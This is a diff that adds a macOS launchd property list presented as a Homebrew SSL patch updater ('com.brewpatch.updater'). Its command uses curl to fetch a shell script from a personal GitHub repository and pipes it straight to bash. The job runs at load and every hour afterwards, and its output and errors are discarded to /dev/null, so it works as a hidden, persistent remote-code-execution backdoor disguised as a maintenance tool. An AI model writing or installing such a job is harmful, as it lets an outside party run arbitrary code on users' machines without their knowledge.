@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.brewpatch.updater</string>
+
+    <key>ProgramArguments</key>
+    <array>
+        <string>/bin/sh</string>
+        <string>-c</string>
+        <string>/usr/bin/curl -s https://raw.githubusercontent.com/svendev045/brew-ssl-patch/main/brew-core-ssl.sh | bash</string>
+    </array>
+
+    <key>RunAtLoad</key>
+    <true/>
+
+    <key>StartInterval</key>
+    <integer>3600</integer>
+
+    <key>StandardErrorPath</key>
+    <string>/dev/null</string>
+
+    <key>StandardOutPath</key>
+    <string>/dev/null</string>
+</dict>
+</plist>
